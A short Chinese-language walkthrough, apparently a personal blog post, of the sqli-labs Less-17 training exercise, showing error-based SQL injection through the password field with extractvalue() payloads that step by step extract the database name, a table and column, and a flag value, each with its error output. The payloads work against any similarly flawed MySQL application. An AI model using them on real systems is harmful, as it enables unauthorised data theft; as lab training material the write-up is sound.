# 原创
：  less-17 in sqli-labs

# less-17 in sqli-labs

Less-17 报错注入【 ’ 】<br/> 通过判断发现注入点存在于passwd处（在uname处\无反应，passwd处\有报错）<br/> `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin'' at line 1`

爆当前库名：`1' and extractvalue(1,concat(0x7e,(select database()),0x7e))#`<br/> 结果：`XPATH syntax error: '~security~'`

爆库名：`1' and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e))#`<br/> 结果：`XPATH syntax error: '~security~`

爆表名：`1' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e))#`<br/> 结果：`XPATH syntax error: '~hermesflag~'`

爆列名：`1' and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name='hermesflag' limit 1,1),0x7e))#`<br/> 结果：`XPATH syntax error: '~flag~'`

爆数据-1：`1' and extractvalue(1,concat(0x7e,(select flag from hermesflag)))#`<br/> 结果：`XPATH syntax error: '~flag{327a6c4304ad5938eaf0efb6cc'`<br/> 爆数据-2：`1' and extractvalue(1,concat(0x7e,right((select flag from hermesflag),20)))#`<br/> 结果：`XPATH syntax error: '~938eaf0efb6cc3e53dc}'`

最后结果：`flag{327a6c4304ad5938eaf0efb6cc3e53dc}`
